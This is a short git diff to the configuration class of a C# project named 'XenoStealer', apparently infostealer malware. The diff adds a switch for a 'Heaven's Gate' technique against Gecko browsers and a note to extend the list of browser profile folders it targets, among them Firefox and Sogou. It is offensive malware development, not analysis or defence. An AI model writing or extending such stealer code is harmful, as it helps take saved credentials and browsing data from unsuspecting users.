@@ -9,6 +9,18 @@ namespace XenoStealer
     public static class Configuration
     {
 
+        static Configuration() 
+        {
+            //if (!Environment.Is64BitProcess) //reverse them so the 32bit version's will come first.
+            //{
+            //    GeckoBrowsers = (Dictionary<string, string>)GeckoBrowsers.Reverse();
+            //    GeckoLibraryPaths = (Dictionary<string, string>)GeckoLibraryPaths.Reverse();
+            //}
+        }
+
+        public static bool UseHeavensGateOnGecko = false;//this can sometimes be unstable, so if wanted, it can be disabled.
+
+
         public static readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         public static readonly string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
@@ -143,7 +155,7 @@ namespace XenoStealer
 
             {"Sogou", $"{roamingAppData}\\SogouExplorer\\Webkit"}
         };
-        public static Dictionary<string, string> GeckoBrowsers = new Dictionary<string, string>
+        public static Dictionary<string, string> GeckoBrowsers = new Dictionary<string, string>//add librewolf and mercury
         {
             {"Firefox", $"{roamingAppData}\\Mozilla\\Firefox\\Profiles"},
             {"Firefox(x86)", $"{roamingAppData}\\Mozilla\\Firefox\\Profiles"},
